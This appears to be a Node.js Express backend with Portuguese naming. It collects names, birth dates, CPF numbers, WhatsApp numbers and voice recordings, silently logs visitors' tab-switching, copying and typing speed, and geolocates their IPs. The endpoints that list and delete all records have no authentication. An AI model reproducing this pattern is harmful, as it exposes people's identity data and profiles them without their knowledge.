const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'data.json');
const VISITAS_FILE = path.join(__dirname, 'visitas.json');

// Aumenta o limite pra aceitar áudio em base64 (até 10MB)
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.set('trust proxy', true);

if (!fs.existsSync(DB_FILE)) {
  fs.writeFileSync(DB_FILE, JSON.stringify([]));
}
if (!fs.existsSync(VISITAS_FILE)) {
  fs.writeFileSync(VISITAS_FILE, JSON.stringify({ total: 0, hoje: 0, data: new Date().toDateString() }));
}

const lerDados = () => {
  try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')); }
  catch { return []; }
};
const salvarDados = (dados) => fs.writeFileSync(DB_FILE, JSON.stringify(dados, null, 2));

const lerVisitas = () => {
  try { return JSON.parse(fs.readFileSync(VISITAS_FILE, 'utf-8')); }
  catch { return { total: 0, hoje: 0, data: new Date().toDateString() }; }
};
const salvarVisitas = (v) => fs.writeFileSync(VISITAS_FILE, JSON.stringify(v));

function pegarIP(req) {
  const xf = req.headers['x-forwarded-for'];
  if (xf) return xf.split(',')[0].trim();
  return req.ip || req.connection.remoteAddress || 'desconhecido';
}

async function buscarLocalizacao(ip) {
  try {
    if (!ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return { pais: 'Local', codigoPais: 'XX', regiao: '-', cidade: '-', cep: '-', operadora: '-', timezone: '-' };
    }
    const url = `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,isp,org,timezone,query&lang=pt-BR`;
    const r = await fetch(url);
    const d = await r.json();
    if (d.status !== 'success') return null;
    return {
      pais: d.country || '-',
      codigoPais: d.countryCode || '-',
      regiao: d.regionName || '-',
      cidade: d.city || '-',
      cep: d.zip || '-',
      operadora: d.isp || d.org || '-',
      timezone: d.timezone || '-',
    };
  } catch (e) {
    console.log('Erro localização:', e.message);
    return null;
  }
}

// ---------- STATUS ----------
app.get('/status', (req, res) => {
  res.json({ api: 'gets invio on', status: 'online', hora: new Date().toISOString() });
});

// ---------- VISITAS ----------
app.post('/visita', (req, res) => {
  const v = lerVisitas();
  const hoje = new Date().toDateString();
  if (v.data !== hoje) {
    v.data = hoje;
    v.hoje = 0;
  }
  v.total += 1;
  v.hoje += 1;
  salvarVisitas(v);
  res.json({ sucesso: true, total: v.total, hoje: v.hoje });
});

app.get('/visitas', (req, res) => {
  const v = lerVisitas();
  const hoje = new Date().toDateString();
  if (v.data !== hoje) {
    v.data = hoje;
    v.hoje = 0;
    salvarVisitas(v);
  }
  res.json({ sucesso: true, total: v.total, hoje: v.hoje });
});

// ---------- FORMULÁRIO ----------
app.post('/enviar', async (req, res) => {
  const {
    nome, dataNascimento, cpf, whatsapp,
    dispositivo, origem, jaVisitou, tempoPreenchimento,
    tempoFora, copiouAlgo, velocidadeDigitacao
  } = req.body;

  const obrigatorios = { nome, dataNascimento, cpf, whatsapp };
  const faltando = Object.keys(obrigatorios).filter(k => !obrigatorios[k]);
  if (faltando.length > 0) {
    return res.status(400).json({ sucesso: false, erro: 'Campos faltando: ' + faltando.join(', ') });
  }

  const ip = pegarIP(req);
  const localizacao = await buscarLocalizacao(ip);

  const dados = lerDados();
  const novo = {
    id: Date.now(),
    nome,
    dataNascimento,
    cpf,
    whatsapp,
    dispositivo: dispositivo || null,
    ip: ip,
    localizacao: localizacao,
    origem: origem || 'Desconhecida',
    jaVisitou: jaVisitou === true,
    tempoPreenchimento: tempoPreenchimento || 0,
    tempoFora: tempoFora || 0,
    copiouAlgo: copiouAlgo === true,
    velocidadeDigitacao: velocidadeDigitacao || null,
    audio: null,
    audioDuracao: null,
    recebidoEm: new Date().toISOString(),
  };

  dados.push(novo);
  salvarDados(dados);

  res.status(201).json({ sucesso: true, mensagem: 'Cadastro recebido!', dados: novo });
});

// ---------- ÁUDIO ----------
app.post('/enviar-audio', (req, res) => {
  const { idCadastro, audio, duracao } = req.body;

  if (!idCadastro || !audio) {
    return res.status(400).json({ sucesso: false, erro: 'ID ou áudio faltando.' });
  }

  const dados = lerDados();
  const idx = dados.findIndex(d => d.id === Number(idCadastro));
  if (idx === -1) {
    return res.status(404).json({ sucesso: false, erro: 'Cadastro não encontrado.' });
  }

  dados[idx].audio = audio;
  dados[idx].audioDuracao = duracao || 0;
  salvarDados(dados);

  res.json({ sucesso: true, mensagem: 'Áudio salvo!' });
});

// ---------- LISTAR ----------
app.get('/dados', (req, res) => {
  const dados = lerDados();
  res.json({ sucesso: true, total: dados.length, dados });
});

// ---------- DELETAR 1 ----------
app.delete('/dados/:id', (req, res) => {
  const id = Number(req.params.id);
  const dados = lerDados();
  const filtrado = dados.filter(d => d.id !== id);
  if (filtrado.length === dados.length) {
    return res.status(404).json({ sucesso: false, erro: 'ID não encontrado.' });
  }
  salvarDados(filtrado);
  res.json({ sucesso: true, mensagem: 'Registro removido.' });
});

// ---------- DELETAR TUDO ----------
app.delete('/dados', (req, res) => {
  salvarDados([]);
  salvarVisitas({ total: 0, hoje: 0, data: new Date().toDateString() });
  res.json({ sucesso: true, mensagem: 'Tudo zerado: cadastros e visitas.' });
});

app.listen(PORT, () => {
  console.log(`🚀 API rodando na porta ${PORT}`);
});
